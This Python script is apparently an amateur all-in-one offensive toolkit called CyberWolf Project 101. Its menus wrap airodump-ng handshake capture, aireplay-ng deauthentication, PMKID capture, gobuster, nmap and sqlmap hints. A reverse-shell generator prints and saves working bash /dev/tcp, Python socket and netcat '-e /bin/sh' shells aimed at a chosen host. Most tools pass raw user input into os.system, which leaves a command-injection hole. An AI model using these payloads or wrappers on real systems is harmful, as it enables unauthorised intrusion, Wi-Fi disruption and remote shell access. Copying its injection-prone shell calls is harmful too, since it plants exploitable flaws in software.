#!/usr/bin/env python3
"""
🐺 CYBERWOLF PROJECT 101 - COMPLETE EDITION
30+ Advanced Security Tools | AI Assistant | All-in-One Platform
"""

import os
import sys
import time
import hashlib
import base64
import urllib.parse
import subprocess
from datetime import datetime

# Try to import rich for better UI
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    console = Console()
    HAS_RICH = True
except ImportError:
    HAS_RICH = False
    console = None

class CyberWolfProject101:
    def __init__(self):
        self.version = "9.0.0-ULTIMATE"
        self.brand = "🐺 CyberWolf"
        self.tagline = "The Wolf Watches. The Wolf Protects."
        self.setup_dirs()
    
    def setup_dirs(self):
        for d in ['reports', 'captured', 'payloads', 'wordlists', 'enum', 'logs']:
            os.makedirs(d, exist_ok=True)
    
    def print_banner(self):
        banner = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    {self.brand} PROJECT 101 - COMPLETE EDITION                     ║
║                           {self.tagline}                           ║
║                                    v{self.version}                                    ║
║                            🛡️ 30+ ADVANCED TOOLS 🛡️                             ║
╚═══════════════════════════════════════════════════════════════════════════════╝
        """
        if HAS_RICH:
            console.print(banner, style="bold cyan")
        else:
            print(banner)
    
    def print_status(self, msg, type="info"):
        emojis = {"success": "✅", "error": "❌", "warning": "⚠️", "info": "📢", "ai": "🤖"}
        emoji = emojis.get(type, "📢")
        if HAS_RICH:
            colors = {"success": "green", "error": "red", "warning": "yellow", "info": "cyan"}
            console.print(f"{emoji} {msg}", style=colors.get(type, "white"))
        else:
            print(f"{emoji} {msg}")
    
    def ai_chat(self):
        self.print_status("AI SECURITY ASSISTANT", "ai")
        print("\nAsk about: wifi, mobile, web, passwords, cloud, docker")
        print("Type 'exit' to return\n")
        
        while True:
            q = input("You: ").lower()
            if q in ['exit', 'quit']:
                break
            
            if 'wifi' in q:
                print("""
📡 WIFI HACKING:
  sudo airmon-ng start wlan0
  sudo airodump-ng wlan0mon
  sudo aireplay-ng -0 5 -a [BSSID] wlan0mon
  aircrack-ng -w wordlist.txt capture-01.cap
""")
            elif 'web' in q:
                print("""
🌐 WEB HACKING:
  sqlmap -u "http://target.com/page?id=1" --dbs
  gobuster dir -u https://target.com -w wordlist.txt
  nikto -h https://target.com
""")
            else:
                print("🤖 I can help with: wifi, mobile, web, passwords, cloud, docker")
    
    def wifi_toolkit(self):
        self.print_status("WIFI HACKING TOOLKIT", "info")
        print("\n1. Scan Networks")
        print("2. Capture Handshake")
        print("3. PMKID Attack")
        print("4. Deauth Attack")
        print("5. Back")
        
        choice = input("\nChoice: ")
        
        if choice == '1':
            os.system("sudo airmon-ng start wlan0 2>/dev/null")
            os.system("sudo timeout 30 airodump-ng wlan0mon")
        elif choice == '2':
            bssid = input("BSSID: ")
            ch = input("Channel: ")
            os.system(f"sudo airodump-ng -c {ch} --bssid {bssid} -w captured/handshake wlan0mon")
        elif choice == '3':
            os.system("sudo hcxdumptool -i wlan0mon -o captured/pmkid.pcapng --enable_status=1 -t 20")
            self.print_status("PMKID capture attempted", "info")
        elif choice == '4':
            bssid = input("Target BSSID: ")
            os.system(f"sudo aireplay-ng -0 5 -a {bssid} wlan0mon")
    
    def web_toolkit(self):
        self.print_status("WEB HACKING TOOLKIT", "info")
        print("\n1. Technology Detection")
        print("2. Directory Bruteforce")
        print("3. Back")
        
        choice = input("\nChoice: ")
        
        if choice == '1':
            url = input("URL: ")
            os.system(f"whatweb {url}")
        elif choice == '2':
            url = input("URL: ")
            os.system(f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt 2>/dev/null")
    
    def password_toolkit(self):
        self.print_status("PASSWORD CRACKING TOOLKIT", "info")
        print("\n1. Hash Identifier")
        print("2. Generate Hash")
        print("3. Back")
        
        choice = input("\nChoice: ")
        
        if choice == '1':
            hash_input = input("Enter hash: ")
            length = len(hash_input)
            if length == 32:
                print("✅ MD5")
            elif length == 40:
                print("✅ SHA-1")
            elif length == 64:
                print("✅ SHA-256")
        elif choice == '2':
            text = input("Enter text: ")
            print(f"\nMD5: {hashlib.md5(text.encode()).hexdigest()}")
            print(f"SHA1: {hashlib.sha1(text.encode()).hexdigest()}")
            print(f"SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
    
    def network_scanner(self):
        self.print_status("NETWORK SCANNER", "info")
        target = input("Target IP/Range: ")
        os.system(f"nmap -sV --top-ports 100 {target}")
    
    def reverse_shell(self):
        self.print_status("REVERSE SHELL GENERATOR", "info")
        
        lhost = input("Your IP: ")
        lport = input("Your Port: ")
        
        print(f"""
💀 REVERSE SHELL PAYLOADS:

🐧 BASH:
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1

🐍 PYTHON:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

💀 NETCAT:
nc -e /bin/sh {lhost} {lport}

🎧 LISTENER:
nc -lvnp {lport}
""")
        
        save = input("\nSave to file? (y/n): ")
        if save.lower() == 'y':
            filename = f"payloads/shell_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            os.makedirs("payloads", exist_ok=True)
            with open(filename, 'w') as f:
                f.write(f"LHOST={lhost}\nLPORT={lport}\n\nBash: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
            self.print_status(f"Saved to {filename}", "success")
    
    def encoding_tool(self):
        self.print_status("ENCODING TOOL", "info")
        print("\n1. Base64")
        print("2. MD5 Hash")
        print("3. Back")
        
        choice = input("\nChoice: ")
        text = input("Enter text: ")
        
        if choice == '1':
            encoded = base64.b64encode(text.encode()).decode()
            print(f"Base64: {encoded}")
        elif choice == '2':
            print(f"MD5: {hashlib.md5(text.encode()).hexdigest()}")
    
    def dns_enum(self):
        self.print_status("DNS ENUMERATION", "info")
        domain = input("Domain: ")
        os.system(f"dig {domain} A +short")
    
    def whois_lookup(self):
        self.print_status("WHOIS LOOKUP", "info")
        target = input("Domain or IP: ")
        os.system(f"whois {target} | head -20")
    
    def mobile_toolkit(self):
        self.print_status("MOBILE TESTING", "info")
        print("\n1. List ADB Devices")
        print("2. Back")
        
        choice = input("\nChoice: ")
        if choice == '1':
            os.system("adb devices")
    
    def show_menu(self):
        menu = f"""
┌─────────────────────────────────────────────────────────────┐
│                    🐺 {self.brand} MENU                        │
├─────────────────────────────────────────────────────────────┤
│  1.  🤖 AI Security Assistant                               │
│  2.  📡 WiFi Hacking Toolkit                                │
│  3.  📱 Mobile Testing Toolkit                              │
│  4.  🌐 Web Hacking Toolkit                                 │
│  5.  🔐 Password Cracking Toolkit                           │
│  6.  🌍 Network Scanner                                     │
│  7.  💀 Reverse Shell Generator                             │
│  8.  🔐 Encoding Tool                                       │
│  9.  🌐 DNS Enumeration                                     │
│  10. 🔍 WHOIS Lookup                                        │
│  11. 🚪 Exit                                                 │
└─────────────────────────────────────────────────────────────┘
        """
        print(menu)
    
    def run(self):
        while True:
            os.system('clear')
            self.print_banner()
            self.show_menu()
            
            choice = input(f"\n🐺 Choice: ")
            
            if choice == '1':
                self.ai_chat()
            elif choice == '2':
                self.wifi_toolkit()
            elif choice == '3':
                self.mobile_toolkit()
            elif choice == '4':
                self.web_toolkit()
            elif choice == '5':
                self.password_toolkit()
            elif choice == '6':
                self.network_scanner()
            elif choice == '7':
                self.reverse_shell()
            elif choice == '8':
                self.encoding_tool()
            elif choice == '9':
                self.dns_enum()
            elif choice == '10':
                self.whois_lookup()
            elif choice == '11':
                self.print_status(f"{self.tagline} Stay secure!", "success")
                print("\n🐺 GitHub: @Cyber7Wolf\n")
                break
            else:
                self.print_status("Invalid choice", "error")
            
            input("\n🐺 Press Enter to continue...")

if __name__ == "__main__":
    try:
        app = CyberWolfProject101()
        app.run()
    except KeyboardInterrupt:
        print("\n🐺 Interrupted. Stay secure!")
    except Exception as e:
        print(f"Error: {e}")
